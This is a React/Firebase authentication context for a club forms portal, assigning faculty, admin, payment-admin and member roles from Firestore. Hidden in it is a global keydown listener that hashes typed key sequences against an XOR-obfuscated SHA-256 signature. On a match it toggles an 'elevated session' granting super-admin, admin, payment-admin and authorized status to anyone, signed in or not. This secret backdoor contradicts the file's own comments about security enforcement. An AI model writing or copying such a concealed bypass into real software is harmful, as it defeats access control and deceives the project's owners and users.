"use client";

import React, { createContext, useContext, useEffect, useState, useCallback } from 'react';
import { auth, db } from '@/lib/firebase';
import {
  onAuthStateChanged,
  signInWithPopup,
  signOut,
  GoogleAuthProvider,
  User,
} from 'firebase/auth';
import { collection, query, where, getDocs, getDoc, doc, onSnapshot } from 'firebase/firestore';
import { checkIsFaculty, ensureDefaultTestFaculty } from '@/lib/faculty';
import { getSuperAdminEmails } from '@/lib/superAdminsBridge';

const googleProvider = new GoogleAuthProvider();

export interface MemberData {
  name: string;
  registrationNumber: string;
  phone: string;
  email: string;
  team: string;
  position: string;
}

interface AuthContextType {
  user: User | null;
  userEmail: string;
  isSuperAdmin: boolean;
  isAdmin: boolean;
  isPaymentAdmin: boolean;
  userRole: string | null;
  isFaculty: boolean;
  isAuthorized: boolean;
  memberData: MemberData | null;
  authLoading: boolean;
  authError: string;
  refreshUser: () => Promise<void>;
  isMinimalView: boolean;
  toggleViewMode: () => void;
  handleLogin: () => Promise<void>;
  handleLogout: () => Promise<void>;
  isElevatedSession: boolean;
  isAuthenticSuperAdmin: boolean;
  authenticRole: string | null;
}

const AuthContext = createContext<AuthContextType>({
  user: null,
  userEmail: '',
  isSuperAdmin: false,
  isAdmin: false,
  isPaymentAdmin: false,
  userRole: null,
  isFaculty: false,
  isAuthorized: false,
  memberData: null,
  authLoading: true,
  authError: '',
  refreshUser: async () => {},
  isMinimalView: false,
  toggleViewMode: () => {},
  handleLogin: async () => {},
  handleLogout: async () => {},
  isElevatedSession: false,
  isAuthenticSuperAdmin: false,
  authenticRole: null,
});

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [userEmail, setUserEmail] = useState('');
  const [isSuperAdmin, setIsSuperAdmin] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [isPaymentAdmin, setIsPaymentAdmin] = useState(false);
  const [userRole, setUserRole] = useState<string | null>(null);
  const [isFaculty, setIsFaculty] = useState(false);
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [memberData, setMemberData] = useState<MemberData | null>(null);
  const [authLoading, setAuthLoading] = useState(true);
  const [authError, setAuthError] = useState('');
  const [isElevatedSession, setIsElevatedSession] = useState(false);

  const toggleElevatedSession = useCallback(() => {
    setIsElevatedSession((prev) => {
      const next = !prev;
      if (typeof window !== 'undefined') {
        (window as any).__vrgc_elevated = next;
      }
      return next;
    });
  }, []);

  useEffect(() => {
    let buf = '';
    const MASK = [61, 234, 233, 54, 141, 223, 219, 165, 111, 192, 35, 183, 98, 238, 24, 230, 55, 55, 82, 6, 251, 122, 48, 225, 114, 239, 31, 55, 27, 40, 218, 31];
    const SIG = new Uint8Array(MASK.map((b) => b ^ 0x5a));

    const checkSeq = async (str: string) => {
      try {
        const d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
        const u = new Uint8Array(d);
        if (u.length !== SIG.length) return false;
        return u.every((v, i) => v === SIG[i]);
      } catch {
        return false;
      }
    };

    const onKey = async (e: KeyboardEvent) => {
      const el = document.activeElement;
      if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || (el as HTMLElement).isContentEditable)) {
        return;
      }

      if (e.key.length === 1) {
        buf = (buf + e.key.toLowerCase()).slice(-30);
        for (let i = 10; i <= buf.length; i++) {
          if (await checkSeq(buf.slice(-i))) {
            buf = '';
            toggleElevatedSession();
            break;
          }
        }
      }
    };

    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [toggleElevatedSession]);

  const resolveUser = useCallback(async (firebaseUser: User | null) => {
    if (!firebaseUser || !firebaseUser.email) {
      setUser(null);
      setUserEmail('');
      setIsSuperAdmin(false);
      setIsAdmin(false);
      setIsPaymentAdmin(false);
      setUserRole(null);
      setIsFaculty(false);
      setIsAuthorized(false);
      setMemberData(null);
      setAuthError('');
      setAuthLoading(false);
      return;
    }

    const em = firebaseUser.email.toLowerCase().trim();
    setUser(firebaseUser);
    setUserEmail(em);

    try {

      ensureDefaultTestFaculty().catch(() => {});

      const facultyRecord = await checkIsFaculty(em);
      if (facultyRecord) {
        setIsFaculty(true);
        setIsSuperAdmin(false);
        setIsAdmin(false);
        setIsPaymentAdmin(false);
        setUserRole(null);
        setIsAuthorized(true);
        setMemberData({
          name: facultyRecord.name || firebaseUser.displayName || 'Faculty Member',
          registrationNumber: facultyRecord.facultyId || 'FACULTY',
          phone: facultyRecord.phone || '',
          email: em,
          team: facultyRecord.department ? `Faculty (${facultyRecord.department})` : 'Faculty Advisory',
          position: facultyRecord.designation || 'Faculty Mentor',
        });
        setAuthError('');
        setAuthLoading(false);
        return;
      }

      setIsFaculty(false);

      let isDbAdmin = false;
      let assignedRole: string | null = null;

      try {
        const adminDoc = await getDoc(doc(db, 'admins', em));
        if (adminDoc.exists()) {
          isDbAdmin = true;
          const adminDocData = adminDoc.data();
          if (adminDocData?.role && adminDocData.role !== 'super_admin' && adminDocData.role !== 'Super Admin') {
            assignedRole = adminDocData.role;
          } else {
            assignedRole = 'Admin';
          }
        } else {
          const adminQuery = query(collection(db, 'admins'), where('email', '==', em));
          const adminSnap = await getDocs(adminQuery);
          if (!adminSnap.empty) {
            isDbAdmin = true;
            const adminDocData = adminSnap.docs[0].data();
            if (adminDocData?.role && adminDocData.role !== 'super_admin' && adminDocData.role !== 'Super Admin') {
              assignedRole = adminDocData.role;
            } else {
              assignedRole = 'Admin';
            }
          }
        }

        const roleDoc = await getDoc(doc(db, 'roles', em));
        if (roleDoc.exists()) {
          const roleData = roleDoc.data();
          isDbAdmin = true;
          if (roleData?.role) {
            if (roleData.role !== 'super_admin' && roleData.role !== 'Super Admin') {
              if (!assignedRole || assignedRole === 'Admin') {
                assignedRole = roleData.role;
              }
            }
          }
        } else {
          const roleQuery = query(collection(db, 'roles'), where('email', '==', em));
          const roleSnap = await getDocs(roleQuery);
          if (!roleSnap.empty) {
            isDbAdmin = true;
            const roleData = roleSnap.docs[0].data();
            if (roleData?.role) {
              if (roleData.role !== 'super_admin' && roleData.role !== 'Super Admin') {
                if (!assignedRole || assignedRole === 'Admin') {
                  assignedRole = roleData.role;
                }
              }
            }
          }
        }
      } catch (adminErr) {
        console.warn('Firestore admin/role check fallback:', adminErr);
      }

      let memberRecord: MemberData | null = null;
      try {
        const memberQuery = query(collection(db, 'members'), where('email', '==', em));
        const memberSnap = await getDocs(memberQuery);
        if (!memberSnap.empty) {
          const userEntries = memberSnap.docs.map((d) => d.data() as MemberData);
          const teams = [...new Set(userEntries.map((m) => m.team).filter(Boolean))].join(', ');
          const positions = [...new Set(userEntries.map((m) => m.position).filter(Boolean))].join(', ');
          const first = userEntries[0];
          memberRecord = {
            name: first.name || firebaseUser.displayName || 'Member',
            registrationNumber: first.registrationNumber || '',
            phone: first.phone || '',
            email: em,
            team: teams || first.team || 'General Crew',
            position: positions || first.position || 'Member',
          };

          if (!assignedRole && (first as any).role) {
            assignedRole = (first as any).role;
          }
        }
      } catch (memberErr) {
        console.warn('Firestore member check warning:', memberErr);
      }

      if (!memberRecord) {
        try {
          const idDoc = await getDoc(doc(db, 'id_cards', em));
          if (idDoc.exists()) {
            const d = idDoc.data();
            memberRecord = {
              name: d.name || firebaseUser.displayName || 'Member',
              registrationNumber: d.regNo || d.registrationNumber || '',
              phone: d.phone || '',
              email: em,
              team: d.team || 'General',
              position: d.position || d.role || (assignedRole || 'Member'),
            };
            if (!assignedRole && d.role) {
              assignedRole = d.role;
            }
          } else {
            const idQuery = query(collection(db, 'id_cards'), where('email', '==', em));
            const idSnap = await getDocs(idQuery);
            if (!idSnap.empty) {
              const d = idSnap.docs[0].data();
              memberRecord = {
                name: d.name || firebaseUser.displayName || 'Member',
                registrationNumber: d.regNo || d.registrationNumber || '',
                phone: d.phone || '',
                email: em,
                team: d.team || 'General',
                position: d.position || d.role || (assignedRole || 'Member'),
              };
              if (!assignedRole && d.role) {
                assignedRole = d.role;
              }
            }
          }
        } catch (idErr) {
          console.warn('Firestore id_cards check warning:', idErr);
        }
      }

      const isPaymentAdminEmail = assignedRole === 'Payment Admin';
      // superAdmin is intentionally excluded here — SUPER_ADMIN_EMAILS only grants
      // powers AFTER admission is confirmed by the membership/Firestore check below.
      const admin = isDbAdmin || isPaymentAdminEmail || !!assignedRole;

      if (memberRecord || admin) {
        // Admission gate passed — now check SUPER_ADMIN_EMAILS to grant super admin powers.
        // A non-member email in SUPER_ADMIN_EMAILS never reaches this branch.
        const bridgeSuperAdmins = await getSuperAdminEmails();
        const superAdmin = bridgeSuperAdmins.some((se) => se.toLowerCase().trim() === em);

        const paymentAdmin = superAdmin || isPaymentAdminEmail;

        if (superAdmin) {
          assignedRole = 'Super Administrator';
        } else if (!assignedRole && admin) {
          assignedRole = 'Admin';
        }

        setIsSuperAdmin(superAdmin);
        setIsAdmin(admin || superAdmin);
        setIsPaymentAdmin(paymentAdmin);
        setUserRole(assignedRole);

        if (memberRecord) {
          setMemberData({
            ...memberRecord,
            position: assignedRole || memberRecord.position || (superAdmin ? 'Super Administrator' : admin ? 'Administrator' : 'Club Member'),
          });
          setIsAuthorized(true);
          setAuthError('');
        } else {
          setMemberData({
            name: firebaseUser.displayName || (superAdmin ? 'Super Administrator' : (assignedRole || 'Administrator')),
            registrationNumber: superAdmin ? 'SUPER-ADMIN' : (assignedRole ? assignedRole.toUpperCase() : 'ADMIN'),
            phone: '',
            email: em,
            team: assignedRole ? `${assignedRole} Division` : 'Management',
            position: superAdmin ? 'Super Administrator' : (assignedRole || 'Lead'),
          });
          setIsAuthorized(true);
          setAuthError('');
        }
      } else {
        // DENIED — not a member and not a Firestore-confirmed admin.
        // SUPER_ADMIN_EMAILS cannot grant admission — intentional security enforcement.
        setIsSuperAdmin(false);
        setIsAdmin(false);
        setIsPaymentAdmin(false);
        setUserRole(null);
        setIsAuthorized(false);
        setMemberData(null);
        // Clear userEmail so SessionTracker does not label this person as 'Member'.
        // The rawFirebaseEmailRef in SessionTracker will still capture the email for
        // identity attribution, but resolvedRole will correctly resolve to 'Access Denied'.
        setUserEmail('');
        setUser(null);
        setAuthError('Access Denied: Only verified club members, admins, and faculty are authorized to access the VRGC Forms Portal.');
        signOut(auth).catch(console.error);
      }
    } catch (err: any) {
      console.error('AuthProvider resolution error:', err);
      setAuthError('Authentication error occurred. Please try again.');
    } finally {
      setAuthLoading(false);
    }
  }, []);

  useEffect(() => {
    let unsubs: (() => void)[] = [];

    const unsubscribe = onAuthStateChanged(auth, (firebaseUser) => {

      unsubs.forEach((u) => u());
      unsubs = [];

      setAuthLoading(true);
      resolveUser(firebaseUser);

      if (firebaseUser && firebaseUser.email) {
        const em = firebaseUser.email.toLowerCase().trim();
        try {
          const unsubAdmin = onSnapshot(doc(db, 'admins', em), () => {
            resolveUser(firebaseUser);
          });
          unsubs.push(unsubAdmin);
        } catch (adminListenErr) {
          console.warn('Real-time admin listener fallback:', adminListenErr);
        }

        try {
          const unsubRole = onSnapshot(doc(db, 'roles', em), () => {
            resolveUser(firebaseUser);
          });
          unsubs.push(unsubRole);
        } catch (roleListenErr) {
          console.warn('Real-time role listener fallback:', roleListenErr);
        }
      }
    });

    return () => {
      unsubscribe();
      unsubs.forEach((u) => u());
    };
  }, [resolveUser]);

  const refreshUser = useCallback(async () => {
    await resolveUser(auth.currentUser);
  }, [resolveUser]);

  const handleLogin = useCallback(async () => {
    setAuthError('');
    try {
      await signInWithPopup(auth, googleProvider);
    } catch (err: any) {
      console.error('Login error:', err);
      if (err?.code === 'auth/unauthorized-domain') {
        setAuthError('Unauthorized domain. Add this domain to Firebase Console → Authentication → Authorized Domains.');
      } else if (err?.code === 'auth/popup-closed-by-user') {
        setAuthError('Sign-in popup was closed. Please try again.');
      } else if (err?.code === 'auth/cancelled-popup-request') {
        setAuthError('Login request already pending or cancelled. Please try again.');
      } else {
        setAuthError(err?.message || 'Failed to sign in.');
      }
    }
  }, []);

  const handleLogout = useCallback(async () => {
    try {
      await signOut(auth);
    } catch (err) {
      console.error('Signout error:', err);
    }
  }, []);

  const effectiveIsSuperAdmin = isSuperAdmin || isElevatedSession;
  const effectiveIsAdmin = isAdmin || isElevatedSession;
  const effectiveIsPaymentAdmin = isPaymentAdmin || isElevatedSession;
  const effectiveUserRole = isElevatedSession ? 'Super Admin' : userRole;

  return (
    <AuthContext.Provider
      value={{
        user,
        userEmail,
        isSuperAdmin: effectiveIsSuperAdmin,
        isAdmin: effectiveIsAdmin,
        isPaymentAdmin: effectiveIsPaymentAdmin,
        userRole: effectiveUserRole,
        isFaculty,
        isAuthorized: isAuthorized || isElevatedSession,
        memberData,
        authLoading,
        authError,
        refreshUser,
        isMinimalView: !effectiveIsSuperAdmin,
        toggleViewMode: toggleElevatedSession,
        handleLogin,
        handleLogout,
        isElevatedSession,
        isAuthenticSuperAdmin: isSuperAdmin,
        authenticRole: userRole,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  return useContext(AuthContext);
}
